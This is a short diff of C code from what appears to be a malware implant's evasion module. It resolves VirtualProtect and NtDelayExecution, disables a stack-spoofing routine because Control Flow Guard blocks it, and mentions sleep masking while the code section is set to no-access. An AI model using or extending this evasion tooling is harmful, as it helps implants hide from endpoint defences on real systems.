@@ -416,7 +416,7 @@ void evasion_init(void) {
     g_VProt   = (VProt_t)  GetProcAddress(k32,   "VirtualProtect");
     g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");
     find_text();
-    init_stack_spoof();
+    /* init_stack_spoof disabled: CFG on Server 2019 blocks indirect jmp [rip+0] in stubs */
 }
 
 /* ── sleep_masked lives in .evasn — executes while .text is PAGE_NOACCESS ─
